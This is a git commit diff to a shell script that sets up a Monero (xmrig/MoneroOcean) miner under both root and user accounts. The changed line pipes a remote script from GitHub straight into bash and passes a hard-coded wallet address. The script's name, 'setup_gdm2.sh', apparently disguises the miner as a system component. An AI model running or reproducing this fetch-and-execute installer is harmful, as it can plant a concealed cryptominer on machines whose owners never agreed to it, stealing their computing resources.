ece771339555a695c65fcbe0161b01c7b4beee20
littlAcen <113854209+littlAcen@users.noreply.github.com>
2024-03-24 05:02:16 +0100

    Update setup_mo_4_r00t_and_user.sh

--- setup_mo_4_r00t_and_user.sh
+++ setup_mo_4_r00t_and_user.sh
@@ -8,7 +8,7 @@ rootstuff(){
   [ "$USER" != root ] && sudo -u "$USER" "$0"
 }
 userstuff(){
-  curl  -s -L https://raw.githubusercontent.com/littlAcen/xmrig_setup_m0dd3d-1/master/setup_gdm2.sh | bash -s 43mKUn7MzfnaZWxrcgJEUpD3oc7MWV8ceXhDgY8w7gQSMRvXN5N3Qj4AYGb2kHPxUECvJbF9P2esnPUkxbFN6zdwHbEHBru
+  curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 43mKUn7MzfnaZWxrcgJEUpD3oc7MWV8ceXhDgY8w7gQSMRvXN5N3Qj4AYGb2kHPxUECvJbF9P2esnPUkxbFN6zdwHbEHBru
 }
 
 if [[ $(id) = uid=0* ]]
